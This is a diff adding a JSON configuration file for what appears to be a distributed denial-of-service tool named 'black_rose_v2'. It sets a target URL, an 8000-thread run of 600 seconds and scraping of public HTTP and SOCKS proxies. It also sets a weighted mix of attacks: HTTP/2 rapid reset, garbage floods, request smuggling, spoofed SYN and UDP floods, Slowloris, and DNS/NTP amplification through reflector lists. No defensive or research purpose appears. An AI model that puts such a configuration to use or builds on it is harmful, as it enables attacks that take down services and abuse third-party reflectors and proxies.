@@ -1,0 +1,49 @@
+{
+    "target": "https://example.com",
+    "duration": 600,
+    "threads": 8000,
+    "proxies": {
+        "proxy_file": "proxies.txt",
+        "sources": [
+            {"type": "http", "url": "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http", "timeout": 5},
+            {"type": "socks4", "url": "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4", "timeout": 5},
+            {"type": "socks5", "url": "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5", "timeout": 5}
+        ],
+        "validate": true,
+        "validation_threads": 500,
+        "validation_timeout": 5
+    },
+    "logging": {
+        "level": "INFO",
+        "file": "black_rose_v2.log"
+    },
+    "attack_mix": {
+        "HYBRID_ASSAULT": 25,
+        "HTTP2_RAPID_RESET": 25,
+        "HTTP_GARBAGE_FLOOD": 15,
+        "HTTP_SMUGGLING": 10,
+        "SPOOF_SYN": 15,
+        "UDP_FLOOD": 10,
+        "SLOWLORIS": 0,
+        "DNS_AMP": 0
+    },
+    "plugin_config": {
+        "rpc": 200,
+        "udp_flood_packet_size": 1472,
+        "http_garbage_flood_size": 4096,
+        "Slowloris": {
+            "sockets_per_thread": 200,
+            "sleep_time": 5
+        },
+        "HTTP2RapidReset": {
+            "streams_per_connection": 1000
+        },
+        "amplification": {
+            "dns_reflectors": "files/dns.txt",
+            "ntp_reflectors": "files/ntp.txt",
+            "dns_domains": ["google.com", "cloudflare.com", "bing.com", "wikipedia.org"],
+            "warmup_percentage": 0.2
+        },
+        "custom_headers_file": "files/headers.txt"
+    }
+}
